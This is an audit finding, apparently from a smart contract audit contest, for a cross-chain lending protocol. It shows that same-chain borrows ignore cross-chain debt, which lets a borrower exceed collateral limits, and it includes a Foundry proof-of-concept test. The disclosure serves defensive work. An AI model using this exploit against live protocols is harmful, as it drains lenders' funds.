# An Attacker Can Exploit Cross Chain borrow to take more borrower than collateral

### Summary

The current implementation allow the borrower to take borrow on same chain and/or cross chain, However this current design can be exploited by borrowing on different chains to take more loan than collateral. As we only check the borrowed amount on target chain and collateral on src chain. There is no way to validate that the borrower has no active borrow on same chain or other chain 


### Root Cause

while Performing cross chain borrow on src chain we fetch the collateral and than validate it on target chain with the borrowed amount :
```solidity
/2025-05-lend-audit-contest/Lend-V2/src/LayerZero/CrossChainRouter.sol:113
113:     function borrowCrossChain(uint256 _amount, address _borrowToken, uint32 _destEid) external payable {
....
136:         // Get current collateral amount for the LayerZero message
137:         // This will be used on dest chain to check if sufficient
138:         (, uint256 collateral) =
139:             lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(_lToken), 0, 0);
140: 
141:         // Send message to destination chain with verified sender
142:         // borrowIndex of 0 initially - will be set correctly on dest chain
143:         _send(
144:             _destEid,
145:             _amount,
146:             0, // Initial borrowIndex, will be set on dest chain
147:             collateral,
148:             msg.sender,
149:             destLToken,
150:             address(0), // liquidator
151:             _borrowToken,
152:             ContractType.BorrowCrossChain
153:         );
154:     }
```
`147` collateral than got validated on targetChain :
On the Target chain : 
```solidity
/2025-05-lend-audit-contest/Lend-V2/src/LayerZero/CrossChainRouter.sol:581
581:     function _handleBorrowCrossChainRequest(LZPayload memory payload, uint32 srcEid) private {
582:         // Accrue interest on borrowed token on destination chain
.... 
616:         // Get existing borrow amount
617:         (uint256 totalBorrowed,) = lendStorage.getHypotheticalAccountLiquidityCollateral(
618:             payload.sender, LToken(payable(payload.destlToken)), 0, payload.amount
619:         );
620: 
621:         // Verify the collateral from source chain is sufficient for total borrowed amount
622:         require(payload.collateral >= totalBorrowed, "Insufficient collateral");
```
Here we check on target chain where borrower will received borrow amount that the collateral on other chain is sufficient to cover the borrow amount.

In case of same Chain borrow we only check the use has any borrow on same chain:
```solidity
/home/aman/Desktop/audits/2025-05-lend-audit-contest/Lend-V2/src/LayerZero/CoreRouter.sol:147
147:     function borrow(uint256 _amount, address _token) external {
....
154:         (uint256 borrowed, uint256 collateral) =
155:             lendStorage.getHypotheticalAccountLiquidityCollateral(msg.sender, LToken(payable(_lToken)), 0, _amount);
156: 
157:         LendStorage.BorrowMarketState memory currentBorrow = lendStorage.getBorrowBalance(msg.sender, _lToken);
158: 
159:         uint256 borrowAmount = currentBorrow.borrowIndex != 0
160:             ? ((borrowed * LTokenInterface(_lToken).borrowIndex()) / currentBorrow.borrowIndex)
161:             : 0;
162: 
163:         require(collateral >= borrowAmount, "Insufficient collateral");
```
here the `currentBorrow::borrowIndex` will be zero as the user has cross chain borrow.

### Internal Pre-conditions

User has Cross chain Borrow


### External Pre-conditions

Nil

### Attack Path

1. Attacker supplies token A as collateral on Chain A
2. Attacker initiates cross-chain borrow from Chain B using maximum allowed amount
3. Protocol records the borrow position on Chain B
4. Attacker cannot borrow more on Chain B due to insufficient collateral coverage
5. Attacker initiates another borrow on Chain A where their collateral is located
6. Since in borrow function we do not check cross chain borrow.
7. Attacker successfully borrows more than their collateral should allow


### Impact

By combining same chain and cross chain borrow the attacker can take more loan than its collateral. The attack can also work with different cross chain borrow


### PoC

Add the following Test case to `TestLiquidations.t.sol` and run with command `forge --mt test_cross_chain_borrow_with_two -vvv`:
```solidity
    function test_cross_chain_borrow_with_two()
        public
    {
        uint256 supplyAmount = 100e18;
        uint256 borrowAmount=55e18;
        supplyAmount =  1000e18;
        borrowAmount = supplyAmount * 65 / 100;

        // Supply collateral on Chain A
        (address tokenA, address lTokenA) = _supplyA(deployer, supplyAmount, 0);

         _supplyA(liquidator, supplyAmount, 0);
        // Supply liquidity on Chain B for borrowing
        (address tokenB, address lTokenB) = _supplyB(liquidator, supplyAmount * 2, 0);

        vm.deal(address(routerA), 1 ether); // For LayerZero fees

        // Borrow cross-chain from Chain A to Chain B
        vm.startPrank(deployer);
        routerA.borrowCrossChain(borrowAmount/2, tokenA, CHAIN_B_ID);
        // vm.roll(100);
        routerA.borrowCrossChain(borrowAmount/2, tokenA, CHAIN_B_ID);
        console2.log("Cross chain borrow will revert as we have alrready borrowed the allowed amount");
        vm.expectRevert();
        routerA.borrowCrossChain(borrowAmount/2, tokenA, CHAIN_B_ID);
        console2.log("But the borrower can still perform same chain borrow and in this way borrower can borrow more than allowed amount");
        coreRouterA.borrow(borrowAmount*2, tokenA);
        vm.stopPrank();
    }
```


### Mitigation

Inside borrow function also check if user has any crossChain borrow
